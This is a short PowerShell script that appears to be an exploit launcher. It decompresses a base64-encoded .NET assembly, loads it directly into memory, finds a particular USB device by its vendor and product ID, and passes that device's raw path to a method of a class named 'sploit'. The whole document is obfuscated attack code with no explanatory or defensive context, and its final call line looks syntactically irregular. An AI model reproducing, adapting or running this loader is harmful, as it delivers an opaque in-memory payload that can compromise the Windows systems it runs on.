$compfile = @'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
'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($compfile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](4608)
$DeflatedStream.Read($UncompressedFileBytes, 0, 4608) | Out-Null
[Reflection.Assembly]::Load($UncompressedFileBytes)

$devs = gwmi Win32_USBControllerDevice
foreach ($dev in $devs) {
        $wmidev = [wmi]$dev.Dependent
        if ($wmidev.GetPropertyValue('DeviceID') -match ('16c0&PID_0476') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
                $fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
        }
}
[ps]::[sploit]::i($fn)
